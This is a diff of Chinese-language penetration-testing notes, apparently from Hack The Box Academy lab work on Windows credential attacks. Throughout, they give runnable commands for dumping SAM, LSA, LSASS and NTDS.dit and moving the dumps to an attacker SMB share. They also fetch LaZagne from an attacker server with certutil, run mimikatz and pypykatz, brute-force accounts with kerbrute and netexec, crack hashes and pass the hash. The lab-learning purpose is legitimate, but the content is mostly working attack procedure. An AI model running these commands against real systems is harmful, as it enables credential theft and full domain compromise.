@@ -175,7 +175,7 @@ C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 使用 smbserver.py 转移凭证
   https://github.com/fortra/impacket/blob/master/examples/smbserver.py
 
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/      在攻击机建立共享
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/      在攻击机建立共享，接收 dump
 
 C:\> move sam.save \\10.10.15.16\CompData      转移去攻击机
 
@@ -189,7 +189,7 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -s
 手动把 samhashes 或 nthashes 哈希放入 hashestocrack.txt
 cut -d ':' -f 4 samhashes.txt > nthashes.txt      从 samhashes 裁剪 nthashes
 sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt      破解哈希
-
+  找对应 mode:  https://hashcat.net/wiki/doku.php?id=example_hashes
 
 hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt      破解 security.save 的 DCC2 哈希
 
@@ -200,52 +200,90 @@ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam            相当于 smbserver.py 转移凭证 加 解析出哈希 加 破解出密码
 
 
+LSASS
+任务管理器转储
+在目标上拥有交互式图形会话的访问权限
+打开 任务管理器
+选择 进程 选项卡
+找到并右键单击 本地安全机构进程 (Local Security Authority Process)
+选择 创建转储文件 (Create dump file)
 
 
+rundll32.exe 的命令行转储
+tasklist /svc            查找 LSASS 的 PID
+或
+Get-Process lsass        查看 LSASS 的 PID
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full      需考虑绕过 AV，将文件传输到攻击机破解
 
 
+Pypykatz 
+用 Python 编写的 Mimikatz 实现 （ Mimikatz 需要使用 Windows 攻击主机）
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp                                       通过 dump 获取用户哈希，包括 Kerberos 相关
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt      破解哈希
 
-  smbserver.py:  start a smb sever on attk host to pull .save, 
-  like http sever:  python3 -m http.server
-    certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe"
 
-  secretsdump:  decrypt creds  format:  (uid:rid:lmhash:nthash)
-  then hashcat: get pwd
-      mode:  https://hashcat.net/wiki/doku.php?id=example_hashes
+rundll32 keymgr.dll,KRShowKeyMgr      GUI 显示保管库凭证，可导出为 .crd 文件
+cmdkey /list                          命令行显示
 
-  https://github.com/fortra/impacket/blob/master/examples/dpapi.py
-  https://github.com/gentilkiwi/mimikatz
-  https://github.com/login-securite/DonPAPI
+runas /savecred /user:SRV01\mcharles cmd      模拟 Interactive 的用户运行 cmd
 
-  netexec / CrackMapExec (old nxc):  dumping and decrypt LSA, SAM
+使用 Mimikatz 提取凭据
+C:\Users\Administrator\Desktop> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::credman
 
-  Get-Process lsass
-  rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
-  https://github.com/skelsec/pypykatz  or mimikatz  to decrypt
+更多工具 SharpDPAPI、LaZagne 和 DonPAPI
 
-  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
-  cmdkey /list
+runas 后，再次 cmdkey /list
+mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe      新建 www 文件夹，下载 lazagne
+python3 -m http.server      在攻击机开启 http 服务器
+C:\Windows\system32> certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe"      从攻击机下载 lazagne
+C:\Windows\Temp\lazagne.exe all      在目标机，本地破解凭证
 
-  runas /savecred /user:SRV01\mcharles cmd
 
-Create acc list:
+可以通过谷歌搜索域名（如，"@inlanefreight.com"）来找到电子邮件结构，并获得一些有效的电子邮件
+可以使用脚本抓取各种社交媒体网站，并组合出潜在的有效用户名
+一些组织试图混淆用户名以防止密码喷洒 (spraying)，可能会将用户名（如 a907 或类似）别名回 joe.smith
+有时可以使用谷歌高级搜索指令 (google dorks)，搜索 "inlanefreight.com filetype:pdf"，如果 PDF 是用图形编辑器生成的，可能会在 PDF 属性中找到一些有效的用户名
+或许能够辨别出用户名的结构，并可能编写一个小脚本来创建许多可能的组合进行喷洒
+
+./username-anarchy -i /home/ltnbob/names.txt > usernames.txt      使用 Username Anarchy，根据 names.txt，自动创建用户名单
+或 ./username-anarchy John Marston > usernames.txt      直接用 John Marston 创建名单
   https://github.com/urbanadventurer/username-anarchy
 
-  brute-force acct with list:
-    https://github.com/ropnop/kerbrute
-  brute-force pwd with list:
-    kerbrute / netexec
+wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute      下载 kerbrute
+./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt      用 Kerbrute 枚举有效用户，也可用于暴力破解、密码喷洒
+
+netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt      爆破 bwilliamson 的密码
+
+evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'      登录
+
+*Evil-WinRM* PS C:\> net localgroup            列出所有本地组
+*Evil-WinRM* PS C:\> net user bwilliamson      查看 bwilliamson 权限
+
+NTDS.dit 文件存储在林 (forest) 中域控制器上的 %systemroot%/ntds 目录
+.dit 代表目录信息树 (directory information tree)
+
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:      创建 C: 驱动器卷影副本 (Volume Shadow Copy, VSS)。NTDS 很可能存储在 C: 盘上，因为这是默认位置
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit      从副本复制到自建目录 c:\NTDS
+或
+reg save hklm\system c:\NTDS\SYSTEM            直接从注册表导出
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData      在攻击机开启 smb 共享后，move NTDS
+
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL      破解 NTDS
+
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil      在攻击机自动化 获取、转储 NTDS
+
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt      从 NTDS 破解哈希
+
+evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b      不破解哈希，用传递哈希登录
 
 
-copy NTDS.dit from C:
-  Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
-  
-  https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service
-  
-  copy and transfer:  netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
-Pass the hash (PtH):
-  evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+
+
+
+
 
   mimikatz.exe privilege::debug "sekurlsa::pth /user:julio" exit      (search for hashes)
   mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
